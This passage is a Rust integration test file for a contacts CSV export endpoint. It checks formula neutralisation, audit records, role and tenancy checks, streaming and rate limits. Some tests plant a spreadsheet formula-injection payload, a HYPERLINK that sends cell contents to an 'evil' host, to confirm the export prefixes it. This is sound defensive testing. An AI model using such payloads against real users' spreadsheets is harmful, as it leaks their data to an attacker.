// SPDX-License-Identifier: AGPL-3.0-only

//! `POST /contacts/export` (spec M1b section 10). Three of its four requirements are invisible when
//! it works, so each has a test that reads the output or the tables rather than a status code.

mod common;

use axum::http::StatusCode;
use common::{PW, TestApp, add_member, api_key, create_user, create_workspace, post_raw};
use futures_util::StreamExt;
use nm::{
    audit::Actor,
    contacts::{ContactFilter, export},
    http::request_meta::RequestMeta,
    workspaces::roles::Role,
};
use serde_json::{Value, json};
use sqlx::PgPool;
use sqlx::postgres::PgPoolOptions;
use std::time::{Duration, Instant};
use uuid::Uuid;

fn base(ws: Uuid) -> String {
    format!("/api/v1/workspaces/{ws}")
}

fn export_uri(ws: Uuid) -> String {
    format!("{}/contacts/export", base(ws))
}

async fn client(pool: &PgPool, email: &str, ws: Uuid, role: Role) -> TestApp {
    let id = create_user(pool, email, PW, false).await;
    add_member(pool, ws, id, role).await;
    let mut app = TestApp::new(pool.clone()).await;
    app.login(email, PW).await;
    app
}

/// A workspace, its owner (signed in) and a signed-in admin.
async fn workspace(pool: &PgPool, slug: &str) -> (Uuid, TestApp, TestApp) {
    let owner_id = create_user(pool, &format!("owner-{slug}@example.com"), PW, false).await;
    let ws = create_workspace(pool, owner_id, slug).await;
    let mut owner = TestApp::new(pool.clone()).await;
    owner.login(&format!("owner-{slug}@example.com"), PW).await;
    let admin = client(pool, &format!("admin-{slug}@example.com"), ws, Role::Admin).await;
    (ws, owner, admin)
}

async fn insert(pool: &PgPool, ws: Uuid, email: &str, first: &str) -> Uuid {
    let id = Uuid::now_v7();
    sqlx::query(
        "insert into contacts (id, workspace_id, email, first_name) values ($1, $2, $3, $4)",
    )
    .bind(id)
    .bind(ws)
    .bind(email)
    .bind(first)
    .execute(pool)
    .await
    .unwrap();
    id
}

/// Splits at every `sep` that no backslash escapes, leaving the escapes in place.
fn split_unescaped(s: &str, sep: char) -> Vec<String> {
    let (mut parts, mut cur, mut chars) = (vec![], String::new(), s.chars());
    while let Some(c) = chars.next() {
        match c {
            '\\' => {
                cur.push(c);
                cur.extend(chars.next());
            }
            c if c == sep => parts.push(std::mem::take(&mut cur)),
            c => cur.push(c),
        }
    }
    parts.push(cur);
    parts
}

fn unescape(s: &str) -> String {
    let (mut out, mut chars) = (String::new(), s.chars());
    while let Some(c) = chars.next() {
        out.push(if c == '\\' { chars.next().unwrap() } else { c });
    }
    out
}

/// RFC 4180, enough of it to read our own output back: quoted cells, doubled quotes. **A bare CR or
/// LF outside quotes ends a record too**, as it does for the many readers that split lines first:
/// a cell holding a line break that was not quoted would show up here as an extra record.
fn parse_csv(text: &str) -> Vec<Vec<String>> {
    let (mut rows, mut row, mut cell) = (vec![], vec![], String::new());
    let mut chars = text.chars().peekable();
    let mut quoted = false;
    while let Some(c) = chars.next() {
        match (quoted, c) {
            (true, '"') if chars.peek() == Some(&'"') => {
                cell.push('"');
                chars.next();
            }
            (true, '"') => quoted = false,
            (true, c) => cell.push(c),
            (false, '"') => quoted = true,
            (false, ',') => row.push(std::mem::take(&mut cell)),
            (false, '\r' | '\n') => {
                if c == '\r' && chars.peek() == Some(&'\n') {
                    chars.next();
                }
                row.push(std::mem::take(&mut cell));
                rows.push(std::mem::take(&mut row));
            }
            (false, c) => cell.push(c),
        }
    }
    rows
}

/// The export as `(header, rows)`.
async fn export(app: &TestApp, ws: Uuid, body: Value) -> (Vec<String>, Vec<Vec<String>>) {
    let r = app.post(&export_uri(ws)).json(&body).await;
    r.assert_status_ok();
    let mut rows = parse_csv(&r.text());
    let head = rows.remove(0);
    (head, rows)
}

fn col(head: &[String], name: &str) -> usize {
    head.iter()
        .position(|h| h == name)
        .unwrap_or_else(|| panic!("no column {name} in {head:?}"))
}

async fn audit_rows(pool: &PgPool) -> Vec<Value> {
    sqlx::query_scalar(
        "select metadata from audit_log where action = 'contacts.exported' order by id",
    )
    .fetch_all(pool)
    .await
    .unwrap()
}

fn problem_type(r: &axum_test::TestResponse) -> String {
    r.json::<Value>()["type"].as_str().unwrap().to_owned()
}

#[sqlx::test]
async fn a_cell_that_would_be_a_formula_is_prefixed(pool: PgPool) {
    let (ws, _owner, admin) = workspace(&pool, "acme").await;
    // The attacker's path: an ordinary signup, through the API, with the payload as a name.
    let payload = r#"=HYPERLINK("http://evil/?x="&A1,"click")"#;
    admin
        .post(&format!("{}/contacts", base(ws)))
        .json(&json!({"email": "mallory@evil.test", "first_name": payload}))
        .await
        .assert_status(StatusCode::CREATED);
    // The API refuses control characters in a name, so tab and CR go in by the back door; a
    // custom field's text takes them through the front.
    let tab = insert(&pool, ws, "tab@example.com", "\tx").await;
    insert(&pool, ws, "cr@example.com", "\rx").await;
    for (email, first) in [
        ("plus@example.com", "+1+1"),
        ("minus@example.com", "-1-1"),
        ("at@example.com", "@sum"),
        ("plain@example.com", "ada"),
    ] {
        insert(&pool, ws, email, first).await;
    }
    admin
        .post(&format!("{}/custom-fields", base(ws)))
        .json(&json!({"key": "note", "label": "Note", "kind": "text"}))
        .await
        .assert_status(StatusCode::CREATED);
    sqlx::query("update contacts set attributes = $2 where id = $1")
        .bind(tab)
        .bind(json!({"note": "=1+1"}))
        .execute(&pool)
        .await
        .unwrap();

    let (head, rows) = export(&admin, ws, json!({})).await;
    let (email, first, note) = (
        col(&head, "email"),
        col(&head, "first_name"),
        col(&head, "attr:note"),
    );
    let by = |e: &str| rows.iter().find(|r| r[email] == e).unwrap().clone();

    assert_eq!(by("mallory@evil.test")[first], format!("'{payload}"));
    for (e, want) in [
        ("tab@example.com", "'\tx"),
        ("cr@example.com", "'\rx"),
        ("plus@example.com", "'+1+1"),
        ("minus@example.com", "'-1-1"),
        ("at@example.com", "'@sum"),
        // Not a formula: left exactly as it was.
        ("plain@example.com", "ada"),
    ] {
        assert_eq!(by(e)[first], want, "{e}");
    }
    assert_eq!(by("tab@example.com")[note], "'=1+1");
    // And the payload did not split into columns: every row is as wide as the header.
    assert!(rows.iter().all(|r| r.len() == head.len()));
}

#[sqlx::test]
async fn columns_are_the_contacts_fields_live_custom_fields_lists_tags_and_suppressed(
    pool: PgPool,
) {
    let (ws, _owner, admin) = workspace(&pool, "acme").await;
    for (key, kind, opts) in [
        ("plan", "text", json!(null)),
        ("gone", "text", json!(null)),
        ("interests", "multi_select", json!(["a", "b"])),
    ] {
        let mut body = json!({"key": key, "label": key, "kind": kind});
        if !opts.is_null() {
            body["options"] = opts;
        }
        admin
            .post(&format!("{}/custom-fields", base(ws)))
            .json(&body)
            .await
            .assert_status(StatusCode::CREATED);
    }
    let a = admin
        .post(&format!("{}/contacts", base(ws)))
        .json(
            &json!({"email": "a@example.com", "first_name": "Ada", "last_name": "L",
            "timezone": "Europe/London",
            "attributes": {"plan": "pro", "gone": "x", "interests": ["b", "a"]}}),
        )
        .await;
    a.assert_status(StatusCode::CREATED);
    let a: Uuid = a.json::<Value>()["id"].as_str().unwrap().parse().unwrap();
    insert(&pool, ws, "b@example.com", "Bo").await;
    // Archived: the column goes, the stored value stays.
    admin
        .delete(&format!(
            "{}/custom-fields/{}",
            base(ws),
            field_id(&pool, ws, "gone").await
        ))
        .await
        .assert_status_ok();
    for name in ["zeta", "alpha"] {
        let t = admin
            .post(&format!("{}/tags", base(ws)))
            .json(&json!({"name": name}))
            .await;
        t.assert_status(StatusCode::CREATED);
        sqlx::query(
            "insert into contact_tags (workspace_id, contact_id, tag_id) values ($1, $2, $3)",
        )
        .bind(ws)
        .bind(a)
        .bind(
            t.json::<Value>()["id"]
                .as_str()
                .unwrap()
                .parse::<Uuid>()
                .unwrap(),
        )
        .execute(&pool)
        .await
        .unwrap();
    }
    for (name, status) in [("News", "subscribed"), ("Old", "unsubscribed")] {
        let l = admin
            .post(&format!("{}/lists", base(ws)))
            .json(&json!({"name": name}))
            .await;
        l.assert_status(StatusCode::CREATED);
        sqlx::query(
            "insert into list_memberships (workspace_id, contact_id, list_id, status) \
             values ($1, $2, $3, $4)",
        )
        .bind(ws)
        .bind(a)
        .bind(
            l.json::<Value>()["id"]
                .as_str()
                .unwrap()
                .parse::<Uuid>()
                .unwrap(),
        )
        .bind(status)
        .execute(&pool)
        .await
        .unwrap();
    }
    sqlx::query(
        "insert into suppressions (id, workspace_id, scope, email, email_hmac, reason) \
         values ($1, $2, 'address', 'b@example.com', '\\x00', 'manual')",
    )
    .bind(Uuid::now_v7())
    .bind(ws)
    .execute(&pool)
    .await
    .unwrap();

    let (head, rows) = export(&admin, ws, json!({})).await;
    assert_eq!(
        head,
        [
            "id",
            "email",
            "first_name",
            "last_name",
            "timezone",
            "created_at",
            "updated_at",
            "attr:plan",
            "attr:interests",
            "lists",
            "tags",
            "suppressed"
        ]
    );
    let a = rows.iter().find(|r| r[1] == "a@example.com").unwrap();
    assert_eq!(a[col(&head, "attr:plan")], "pro");
    assert_eq!(a[col(&head, "attr:interests")], "b;a");
    // The status travels with the name: `unsubscribed` must not read as `subscribed` on re-import.
    assert_eq!(a[col(&head, "lists")], "News:subscribed;Old:unsubscribed");
    assert_eq!(a[col(&head, "tags")], "alpha;zeta");
    assert_eq!(a[col(&head, "suppressed")], "false");
    let b = rows.iter().find(|r| r[1] == "b@example.com").unwrap();
    assert_eq!(b[col(&head, "suppressed")], "true");
    assert_eq!(b[col(&head, "lists")], "");
}

async fn field_id(pool: &PgPool, ws: Uuid, key: &str) -> Uuid {
    sqlx::query_scalar("select id from custom_fields where workspace_id = $1 and key = $2")
        .bind(ws)
        .bind(key)
        .fetch_one(pool)
        .await
        .unwrap()
}

#[sqlx::test]
async fn the_audit_row_has_the_filter_and_the_count_and_never_the_search(pool: PgPool) {
    let (ws, _owner, admin) = workspace(&pool, "acme").await;
    for i in 0..3 {
        insert(&pool, ws, &format!("needle{i}@example.com"), "n").await;
    }
    insert(&pool, ws, "other@example.com", "o").await;
    let tag: Uuid = {
        let t = admin
            .post(&format!("{}/tags", base(ws)))
            .json(&json!({"name": "t"}))
            .await;
        t.json::<Value>()["id"].as_str().unwrap().parse().unwrap()
    };

    let (_, rows) = export(&admin, ws, json!({"q": "needle", "tag_id": tag})).await;
    assert!(rows.is_empty(), "the tag narrows it to nothing");
    let (_, rows) = export(&admin, ws, json!({"q": "needle"})).await;
    assert_eq!(rows.len(), 3);

    let audit = audit_rows(&pool).await;
    assert_eq!(audit.len(), 2);
    let meta = &audit[1];
    assert_eq!(meta["rows"], 3);
    assert_eq!(meta["complete"], true);
    // The filter is there, and the search is recorded as having happened, not as what it said.
    assert_eq!(meta["filter"]["q"], "<redacted>");
    assert_eq!(meta["filter"]["tag_id"], Value::Null);
    assert_eq!(audit[0]["filter"]["tag_id"], json!(tag));
    for m in &audit {
        // Anywhere in the document, not just where `freeze` happens to keep it.
        assert!(!m.to_string().contains("needle"), "{m}");
    }
    let (actor, ws_of): (Option<Uuid>, Option<Uuid>) = sqlx::query_as(
        "select actor_user_id, workspace_id from audit_log where action = 'contacts.exported' \
         order by id limit 1",
    )
    .fetch_one(&pool)
    .await
    .unwrap();
    assert!(actor.is_some());
    assert_eq!(ws_of, Some(ws));
}

#[sqlx::test]
async fn an_editor_is_refused_and_an_admin_is_not(pool: PgPool) {
    let (ws, _owner, admin) = workspace(&pool, "acme").await;
    insert(&pool, ws, "a@example.com", "A").await;
    let editor = client(&pool, "editor@example.com", ws, Role::Editor).await;
    let viewer = client(&pool, "viewer@example.com", ws, Role::Viewer).await;
    for who in [&editor, &viewer] {
        let r = who.post(&export_uri(ws)).json(&json!({})).await;
        r.assert_status(StatusCode::FORBIDDEN);
        assert!(problem_type(&r).ends_with("insufficient-role"));
        assert!(!r.text().contains("a@example.com"));
    }
    assert!(
        audit_rows(&pool).await.is_empty(),
        "a refusal is not an export"
    );
    admin
        .post(&export_uri(ws))
        .json(&json!({}))
        .await
        .assert_status_ok();
    assert_eq!(audit_rows(&pool).await.len(), 1);

    // A stranger gets 404, not 403: tenancy, before role.
    let stranger = {
        create_user(&pool, "stranger@example.com", PW, false).await;
        let mut app = TestApp::new(pool.clone()).await;
        app.login("stranger@example.com", PW).await;
        app
    };
    stranger
        .post(&export_uri(ws))
        .json(&json!({}))
        .await
        .assert_status(StatusCode::NOT_FOUND);
}

#[sqlx::test]
async fn an_api_key_must_be_an_admin_key_too(pool: PgPool) {
    let (ws, owner, _admin) = workspace(&pool, "acme").await;
    insert(&pool, ws, "a@example.com", "A").await;
    let app = TestApp::new(pool.clone()).await;
    let editor_key = api_key(&owner, ws, "editor").await;
    let admin_key = api_key(&owner, ws, "admin").await;
    let r = post_raw(&app.state, &editor_key, &export_uri(ws), &json!({})).await;
    assert_eq!(r.status(), StatusCode::FORBIDDEN);
    let r = post_raw(&app.state, &admin_key, &export_uri(ws), &json!({})).await;
    assert_eq!(r.status(), StatusCode::OK);
    let _ = r.into_body().into_data_stream().count().await;
    // Attributed to the key, not to a user.
    let (user, key): (Option<Uuid>, Option<Uuid>) = sqlx::query_as(
        "select actor_user_id, actor_api_key_id from audit_log where action = 'contacts.exported'",
    )
    .fetch_one(&pool)
    .await
    .unwrap();
    assert!(user.is_none() && key.is_some());
}

#[sqlx::test]
async fn another_workspaces_contacts_are_never_exported(pool: PgPool) {
    let (ws, _owner, admin) = workspace(&pool, "acme").await;
    let (other, _o2, _a2) = workspace(&pool, "rival").await;
    insert(&pool, ws, "mine@example.com", "Mine").await;
    insert(&pool, other, "theirs@example.com", "Theirs").await;
    // The same address in both workspaces, and a suppression in the other one only.
    insert(&pool, other, "shared@example.com", "Rival").await;
    insert(&pool, ws, "shared@example.com", "Own").await;

    for body in [json!({}), json!({"q": "example"})] {
        let (head, rows) = export(&admin, ws, body).await;
        let mut emails: Vec<_> = rows
            .iter()
            .map(|r| r[col(&head, "email")].clone())
            .collect();
        emails.sort();
        assert_eq!(emails, ["mine@example.com", "shared@example.com"]);
        assert!(rows.iter().all(|r| r[col(&head, "first_name")] != "Rival"));
    }
}

#[sqlx::test]
async fn an_unresolvable_segment_is_404_and_never_an_export_of_everything(pool: PgPool) {
    let (ws, owner, admin) = workspace(&pool, "acme").await;
    let rival_owner = create_user(&pool, "rival-owner@example.com", PW, false).await;
    let other = create_workspace(&pool, rival_owner, "rival").await;
    let mut rival = TestApp::new(pool.clone()).await;
    rival.login("rival-owner@example.com", PW).await;
    insert(&pool, ws, "mine@example.com", "Mine").await;

    let rules =
        json!({"match": "all", "rules": [{"field": "email", "op": "contains", "value": "e"}]});
    let foreign = rival
        .post(&format!("{}/segments", base(other)))
        .json(&json!({"name": "s", "rules": rules}))
        .await;
    foreign.assert_status(StatusCode::CREATED);
    let foreign: Uuid = foreign.json::<Value>()["id"]
        .as_str()
        .unwrap()
        .parse()
        .unwrap();
    let deleted = owner
        .post(&format!("{}/segments", base(ws)))
        .json(&json!({"name": "d", "rules": rules}))
        .await;
    let deleted: Uuid = deleted.json::<Value>()["id"]
        .as_str()
        .unwrap()
        .parse()
        .unwrap();
    owner
        .delete(&format!("{}/segments/{deleted}", base(ws)))
        .await
        .assert_status(StatusCode::NO_CONTENT);

    for id in [Uuid::now_v7(), foreign, deleted] {
        let r = admin
            .post(&export_uri(ws))
            .json(&json!({"segment_id": id}))
            .await;
        r.assert_status(StatusCode::NOT_FOUND);
        assert!(
            !r.text().contains("mine@example.com"),
            "exported despite {id}"
        );
    }
    assert!(audit_rows(&pool).await.is_empty());
}

#[sqlx::test]
async fn a_segment_narrows_the_export(pool: PgPool) {
    let (ws, owner, admin) = workspace(&pool, "acme").await;
    insert(&pool, ws, "keep@example.com", "K").await;
    insert(&pool, ws, "drop@example.com", "D").await;
    let s = owner
        .post(&format!("{}/segments", base(ws)))
        .json(&json!({"name": "k", "rules": {"match": "all", "rules": [
            {"field": "email", "op": "contains", "value": "keep"}]}}))
        .await;
    s.assert_status(StatusCode::CREATED);
    let s = s.json::<Value>()["id"].clone();
    let (head, rows) = export(&admin, ws, json!({"segment_id": s})).await;
    assert_eq!(rows.len(), 1);
    assert_eq!(rows[0][col(&head, "email")], "keep@example.com");
    assert_eq!(audit_rows(&pool).await[0]["filter"]["segment_id"], s);
}

#[sqlx::test]
async fn a_bad_filter_is_422(pool: PgPool) {
    let (ws, _owner, admin) = workspace(&pool, "acme").await;
    for body in [
        json!({"q": "ab"}),
        json!({"list_status": "subscribed"}),
        json!({"tg": 1}),
    ] {
        admin
            .post(&export_uri(ws))
            .json(&body)
            .await
            .assert_status(StatusCode::UNPROCESSABLE_ENTITY);
    }
}

/// The shape that forces streaming: with far more rows than the channel can hold, the first bytes
/// are in the caller's hands while the producer is still blocked mid-result. The audit row is the
/// witness, because it is written only once the last row has been read: a buffering endpoint has
/// already written it before it returns a single byte.
///
/// Memory itself is measured in `tests/export_memory.rs`.
#[sqlx::test]
async fn the_first_bytes_arrive_before_the_last_row_is_read(pool: PgPool) {
    let (ws, owner, _admin) = workspace(&pool, "acme").await;
    seed(&pool, ws, 20_000).await;
    let app = TestApp::new(pool.clone()).await;
    let key = api_key(&owner, ws, "admin").await;

    let r = post_raw(&app.state, &key, &export_uri(ws), &json!({})).await;
    assert_eq!(r.status(), StatusCode::OK);
    assert_eq!(r.headers()["content-type"], "text/csv; charset=utf-8");
    let mut body = r.into_body().into_data_stream();
    let header = body.next().await.unwrap().unwrap();
    assert!(header.starts_with(b"id,email,"));
    let first_rows = body.next().await.unwrap().unwrap();
    assert!(first_rows.len() < 200_000, "one chunk, not the book");
    // Give a producer that is not blocked every chance to finish and write its audit row.
    tokio::time::sleep(std::time::Duration::from_millis(500)).await;
    assert!(
        audit_rows(&pool).await.is_empty(),
        "the export finished reading before the client had read its first rows"
    );

    let mut total = first_rows.iter().filter(|&&b| b == b'\n').count();
    while let Some(chunk) = body.next().await {
        total += chunk.unwrap().iter().filter(|&&b| b == b'\n').count();
    }
    assert_eq!(total, 20_000);
    let audit = audit_rows(&pool).await;
    assert_eq!(audit.len(), 1);
    assert_eq!(audit[0]["rows"], 20_000);
    assert_eq!(audit[0]["complete"], true);
}

/// Someone who reads part of the book and hangs up has still read part of it.
#[sqlx::test]
async fn a_client_that_leaves_is_still_audited_as_incomplete(pool: PgPool) {
    let (ws, owner, _admin) = workspace(&pool, "acme").await;
    seed(&pool, ws, 20_000).await;
    let app = TestApp::new(pool.clone()).await;
    let key = api_key(&owner, ws, "admin").await;
    let r = post_raw(&app.state, &key, &export_uri(ws), &json!({})).await;
    let mut body = r.into_body().into_data_stream();
    body.next().await.unwrap().unwrap();
    drop(body);

    let mut audit = vec![];
    for _ in 0..50 {
        audit = audit_rows(&pool).await;
        if !audit.is_empty() {
            break;
        }
        tokio::time::sleep(std::time::Duration::from_millis(100)).await;
    }
    assert_eq!(audit.len(), 1, "no audit row for an abandoned export");
    assert_eq!(audit[0]["complete"], false);
    // The producer *stopped*: the client took one chunk, so at most the channel's two slots, the
    // chunk blocked in `send` and a few more are ahead of it, which is a few hundred rows of
    // 20,000. A producer that ignored the send error would read the book for nobody and report
    // all of it; `< 20_000` alone would pass for it on the final partial chunk failing to send.
    let rows = audit[0]["rows"].as_u64().unwrap();
    assert!(
        rows < 2_000,
        "the producer read {rows} rows for a client that had gone"
    );
}

/// Two exports on a pool of two, both paused mid-result, both then finished. The audit write needs
/// a connection of its own, so a producer that still holds its export's connection when it asks
/// waits on one only the other export can free: after the acquire timeout one row is lost and the
/// body stalls, which in production is thirty seconds and a completed export that went unrecorded.
#[sqlx::test]
async fn finishing_exports_do_not_wait_on_each_other_for_the_audit_connection(pool: PgPool) {
    let (ws, owner, _admin) = workspace(&pool, "acme").await;
    seed(&pool, ws, 20_000).await;
    let key = api_key(&owner, ws, "admin").await;
    let small = PgPoolOptions::new()
        .max_connections(2)
        .acquire_timeout(Duration::from_secs(3))
        .connect_with((*pool.connect_options()).clone())
        .await
        .unwrap();
    let app = TestApp::new(small).await;

    let mut bodies = vec![];
    for _ in 0..2 {
        let r = post_raw(&app.state, &key, &export_uri(ws), &json!({})).await;
        assert_eq!(r.status(), StatusCode::OK);
        let mut body = r.into_body().into_data_stream();
        body.next().await.unwrap().unwrap();
        body.next().await.unwrap().unwrap();
        bodies.push(body);
    }
    let (mut a, mut b) = (bodies.remove(0), bodies.remove(0));
    let started = Instant::now();
    tokio::join!(async { while a.next().await.is_some() {} }, async {
        while b.next().await.is_some() {}
    });
    assert!(
        started.elapsed() < Duration::from_secs(2),
        "the exports waited {:?} on the pool",
        started.elapsed()
    );
    let audit = audit_rows(&pool).await;
    assert_eq!(audit.len(), 2, "a completed export went unrecorded");
    assert!(
        audit
            .iter()
            .all(|m| m["complete"] == true && m["rows"] == 20_000)
    );
}

/// A client that stops reading does not hold a connection for ever. The body is kept alive and
/// unread throughout, so this is the send timeout and not a disconnect.
#[sqlx::test]
async fn a_client_that_stops_reading_is_cut_off_after_the_send_timeout(pool: PgPool) {
    let (ws, _owner, _admin) = workspace(&pool, "acme").await;
    seed(&pool, ws, 20_000).await;
    let conn = pool.acquire().await.unwrap();
    let owner_id: Uuid = sqlx::query_scalar("select id from users where email = $1")
        .bind("owner-acme@example.com")
        .fetch_one(&pool)
        .await
        .unwrap();
    let body = export::start(
        pool.clone(),
        conn,
        export::Export {
            workspace_id: ws,
            filter: ContactFilter::default(),
            rules: None,
            live: vec![],
        },
        export::Audit {
            meta: RequestMeta::default(),
            actor: Actor::User(owner_id),
            filter: json!({}),
        },
        Duration::from_millis(200),
    );
    let mut body = body.into_data_stream();
    body.next().await.unwrap().unwrap();

    let mut audit = vec![];
    for _ in 0..50 {
        audit = audit_rows(&pool).await;
        if !audit.is_empty() {
            break;
        }
        tokio::time::sleep(Duration::from_millis(100)).await;
    }
    assert_eq!(
        audit.len(),
        1,
        "an export held for a client that stopped reading"
    );
    assert_eq!(audit[0]["complete"], false);
    drop(body);
}

#[sqlx::test]
async fn exports_are_rate_limited_per_workspace(pool: PgPool) {
    let (ws, _owner, admin) = workspace(&pool, "acme").await;
    insert(&pool, ws, "a@example.com", "A").await;
    for _ in 0..nm::http::rate_limit::EXPORT_PER_MINUTE {
        let r = admin.post(&export_uri(ws)).json(&json!({})).await;
        r.assert_status_ok();
        assert!(r.headers().contains_key("ratelimit-remaining"));
    }
    let r = admin.post(&export_uri(ws)).json(&json!({})).await;
    r.assert_status(StatusCode::TOO_MANY_REQUESTS);
    assert!(r.headers().contains_key("retry-after"));
    assert!(!r.text().contains("a@example.com"));
    assert_eq!(
        audit_rows(&pool).await.len(),
        nm::http::rate_limit::EXPORT_PER_MINUTE as usize,
        "a refused export is not an export"
    );
}

/// Every answer carries the `RateLimit` headers, refusals included, as `create_selection`'s and
/// `preview_segment`'s do — and the quota was spent whichever way it went. This is the smallest of
/// the three at five a minute, so a client refused `422` or `404` is exactly the one that needs to
/// know what is left of its window before it fixes the filter and tries again.
#[sqlx::test]
async fn a_refused_export_keeps_the_rate_limit_headers_it_spent(pool: PgPool) {
    let (ws, _owner, admin) = workspace(&pool, "acme").await;
    insert(&pool, ws, "a@example.com", "A").await;
    let limit = nm::http::rate_limit::EXPORT_PER_MINUTE.to_string();
    for (body, status, why) in [
        // Every refusal that leaves the handler past the quota check: `filter()`'s two, and the
        // segment that is not this workspace's.
        (
            json!({"q": "ab"}),
            StatusCode::UNPROCESSABLE_ENTITY,
            "a short q",
        ),
        (
            json!({"list_status": "subscribed"}),
            StatusCode::UNPROCESSABLE_ENTITY,
            "a list_status with no list_id",
        ),
        (
            json!({"segment_id": Uuid::now_v7()}),
            StatusCode::NOT_FOUND,
            "an unresolvable segment",
        ),
    ] {
        let r = admin.post(&export_uri(ws)).json(&body).await;
        r.assert_status(status);
        assert_eq!(
            r.header("ratelimit-limit").to_str().unwrap(),
            limit,
            "{why} dropped the headers the contract promises"
        );
        assert!(
            r.maybe_header("ratelimit-remaining").is_some(),
            "{why} dropped ratelimit-remaining"
        );
    }
    // All three were counted, so the quota has two of its five left.
    assert_eq!(
        admin
            .post(&export_uri(ws))
            .json(&json!({}))
            .await
            .header("ratelimit-remaining")
            .to_str()
            .unwrap(),
        "1",
        "a refused export did not spend a unit"
    );
}

/// `lists` and `tags` read back to exactly the names that went in, whatever those names hold. A
/// list named `A;B` must not come back as two lists, nor `C:D` as a list `C` with the status `D:...`.
#[sqlx::test]
async fn list_and_tag_names_with_separators_round_trip(pool: PgPool) {
    let (ws, _owner, admin) = workspace(&pool, "acme").await;
    let contact = insert(&pool, ws, "a@example.com", "A").await;
    let lists = [
        ("A;B", "subscribed"),
        ("C:D", "unsubscribed"),
        (r"E\F", "pending"),
        (r"G\;H:I", "subscribed"),
    ];
    for (name, status) in lists {
        let l = admin
            .post(&format!("{}/lists", base(ws)))
            .json(&json!({"name": name}))
            .await;
        l.assert_status(StatusCode::CREATED);
        sqlx::query(
            "insert into list_memberships (workspace_id, contact_id, list_id, status) \
             values ($1, $2, $3, $4)",
        )
        .bind(ws)
        .bind(contact)
        .bind(
            l.json::<Value>()["id"]
                .as_str()
                .unwrap()
                .parse::<Uuid>()
                .unwrap(),
        )
        .bind(status)
        .execute(&pool)
        .await
        .unwrap();
    }
    let tags = ["T;1", "T:2", r"T\3"];
    for name in tags {
        let t = admin
            .post(&format!("{}/tags", base(ws)))
            .json(&json!({"name": name}))
            .await;
        t.assert_status(StatusCode::CREATED);
        sqlx::query(
            "insert into contact_tags (workspace_id, contact_id, tag_id) values ($1, $2, $3)",
        )
        .bind(ws)
        .bind(contact)
        .bind(
            t.json::<Value>()["id"]
                .as_str()
                .unwrap()
                .parse::<Uuid>()
                .unwrap(),
        )
        .execute(&pool)
        .await
        .unwrap();
    }

    let (head, rows) = export(&admin, ws, json!({})).await;
    let row = &rows[0];
    let mut got: Vec<(String, String)> = split_unescaped(&row[col(&head, "lists")], ';')
        .iter()
        .map(|entry| {
            // Exactly one `:` is unescaped, the one between name and status: a name's own colon
            // must not be a second.
            let parts = split_unescaped(entry, ':');
            assert_eq!(parts.len(), 2, "entry {entry:?}");
            (unescape(&parts[0]), parts[1].clone())
        })
        .collect();
    got.sort();
    let mut want: Vec<(String, String)> = lists
        .iter()
        .map(|(n, s)| ((*n).to_owned(), (*s).to_owned()))
        .collect();
    want.sort();
    assert_eq!(got, want, "raw cell {:?}", row[col(&head, "lists")]);

    let mut got_tags: Vec<String> = split_unescaped(&row[col(&head, "tags")], ';')
        .iter()
        .map(|t| unescape(t))
        .collect();
    got_tags.sort();
    let mut want_tags: Vec<String> = tags.iter().map(|t| (*t).to_owned()).collect();
    want_tags.sort();
    assert_eq!(got_tags, want_tags);
}

/// A `multi_select` column is semicolon-joined like `lists` and `tags`, so it needs their escaping
/// for their reason: `validate_options` admits a `;`, so an option of `EMEA; APAC` would otherwise
/// read back as two and be indistinguishable from two. The importer's contract
/// (`export.rs`'s module doc) is written against this, so it has to be one rule for every
/// multi-valued column, not two.
#[sqlx::test]
async fn multi_select_options_with_separators_round_trip(pool: PgPool) {
    let (ws, _owner, admin) = workspace(&pool, "acme").await;
    let options = ["EMEA; APAC", "C:D", r"E\F", r"G\;H:I", "plain"];
    admin
        .post(&format!("{}/custom-fields", base(ws)))
        .json(
            &json!({"key": "regions", "label": "Regions", "kind": "multi_select",
                      "options": options}),
        )
        .await
        .assert_status(StatusCode::CREATED);
    admin
        .post(&format!("{}/contacts", base(ws)))
        .json(&json!({"email": "a@example.com", "attributes": {"regions": options}}))
        .await
        .assert_status(StatusCode::CREATED);

    let (head, rows) = export(&admin, ws, json!({})).await;
    let cell = &rows[0][col(&head, "attr:regions")];
    // The cell splits into exactly as many values as went in — `EMEA; APAC` is one, not two.
    let got: Vec<String> = split_unescaped(cell, ';')
        .iter()
        .map(|v| unescape(v))
        .collect();
    assert_eq!(got, options, "raw cell {cell:?}");
}

/// A number is not a formula, so `-5` comes back as `-5`; nothing that merely starts like one does.
#[sqlx::test]
async fn a_number_field_round_trips_and_lookalikes_stay_prefixed(pool: PgPool) {
    let (ws, _owner, admin) = workspace(&pool, "acme").await;
    admin
        .post(&format!("{}/custom-fields", base(ws)))
        .json(&json!({"key": "score", "label": "Score", "kind": "number"}))
        .await
        .assert_status(StatusCode::CREATED);
    let id = insert(&pool, ws, "n@example.com", "-5").await;
    sqlx::query("update contacts set attributes = $2 where id = $1")
        .bind(id)
        .bind(json!({"score": -5}))
        .execute(&pool)
        .await
        .unwrap();
    for (email, first) in [
        ("a@example.com", "-5-5"),
        ("b@example.com", "-inf"),
        ("c@example.com", "-nan"),
        ("d@example.com", "\t5"),
    ] {
        insert(&pool, ws, email, first).await;
    }
    let (head, rows) = export(&admin, ws, json!({})).await;
    let (email, first, score) = (
        col(&head, "email"),
        col(&head, "first_name"),
        col(&head, "attr:score"),
    );
    let by = |e: &str| rows.iter().find(|r| r[email] == e).unwrap().clone();
    assert_eq!(by("n@example.com")[score], "-5");
    assert_eq!(by("n@example.com")[first], "-5");
    for (e, want) in [
        ("a@example.com", "'-5-5"),
        ("b@example.com", "'-inf"),
        ("c@example.com", "'-nan"),
        ("d@example.com", "'\t5"),
    ] {
        assert_eq!(by(e)[first], want, "{e}");
    }
}

/// A line break inside a cell is quoted, so a reader that splits lines first still finds one
/// record per contact. `x\r=HYPERLINK(...)` unquoted would start a new record whose first cell is
/// an unprefixed formula.
#[sqlx::test]
async fn a_line_break_inside_a_cell_does_not_start_a_new_record(pool: PgPool) {
    let (ws, _owner, admin) = workspace(&pool, "acme").await;
    admin
        .post(&format!("{}/custom-fields", base(ws)))
        .json(&json!({"key": "note", "label": "Note", "kind": "text"}))
        .await
        .assert_status(StatusCode::CREATED);
    let notes = [
        ("lf@example.com", "a\n=1+1"),
        ("cr@example.com", "x\r=HYPERLINK(\"http://evil/\")"),
        ("crlf@example.com", "p\r\n@q"),
    ];
    for (email, note) in notes {
        let id = insert(&pool, ws, email, "n").await;
        sqlx::query("update contacts set attributes = $2 where id = $1")
            .bind(id)
